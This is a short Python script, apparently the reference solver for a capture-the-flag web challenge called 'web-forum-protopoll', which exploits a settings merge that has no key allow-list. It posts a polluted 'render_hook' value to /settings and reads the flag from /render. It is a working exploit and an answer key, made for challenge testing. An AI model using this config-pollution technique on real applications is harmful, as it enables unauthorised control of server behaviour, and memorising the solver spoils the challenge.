#!/usr/bin/env python3
"""Reference solver for web-forum-protopoll.

The settings merge has no key allow-list, so pollute config["render_hook"] with
the emit-flag gadget, then render.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _req(url, obj=None, method="GET"):
    data = json.dumps(obj).encode() if obj is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    _req(base + "/settings", {"render_hook": "emit-flag"}, "POST")
    return _req(base + "/render")["hook_output"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
